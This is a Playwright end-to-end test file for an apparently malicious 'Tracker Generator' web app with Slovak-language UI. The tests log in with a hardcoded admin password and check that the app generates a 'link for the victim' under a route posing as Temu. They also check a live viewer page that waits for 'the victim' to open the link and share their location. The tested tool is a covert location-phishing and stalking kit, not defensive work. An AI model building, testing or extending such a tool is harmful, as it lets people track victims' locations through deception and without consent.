import { test, expect } from '@playwright/test';

const BASE_URL = 'http://localhost:9999';
const ADMIN_PASSWORD = '23513900';

test.describe('Admin Dashboard E2E Flows', () => {
    test.beforeEach(async ({ page }) => {
        await page.goto(BASE_URL);
        // Middleware should redirect to /login
        await page.waitForURL('**/login');
        await page.fill('input[type="password"]', ADMIN_PASSWORD);
        await page.getByRole('button', { name: 'Odomknúť prístup' }).click();
        await page.waitForURL(BASE_URL + '/');
    });

    test('landing page loads correctly', async ({ page }) => {
        await expect(page.locator('h1')).toContainText('Tracker Generator');
        await expect(page.getByText('Zabezpečená administrácia')).toBeVisible();
    });

    test('generates tracking link after form submit', async ({ page }) => {
        await page.fill('input[type="email"]', 'test@example.com');
        await page.getByRole('button', { name: 'Vygenerovať bezpečný odkaz' }).click();
        await expect(page.getByText('1. Link pre Obeť')).toBeVisible();
        const linkText = await page.locator('.break-all').first().textContent();
        expect(linkText).toContain('/temu/');
    });

    test('copy buttons exist', async ({ page }) => {
        await page.fill('input[type="email"]', 'test@example.com');
        await page.getByRole('button', { name: 'Vygenerovať bezpečný odkaz' }).click();
        await expect(page.locator('text=Kopírovať Link')).toBeVisible();
        await expect(page.locator('text=Kopírovať Info')).toBeVisible();
    });
});

test.describe('Public Views E2E Flows', () => {
    test('viewer mode shows live refresh message on temu route', async ({ page }) => {
        await page.goto(`${BASE_URL}/temu/test-token?view=1`);
        await expect(page.getByText('Live Location Viewer')).toBeVisible();
        await expect(page.getByText('Wait for the victim to open the link and allow location...')).toBeVisible();
    });
});
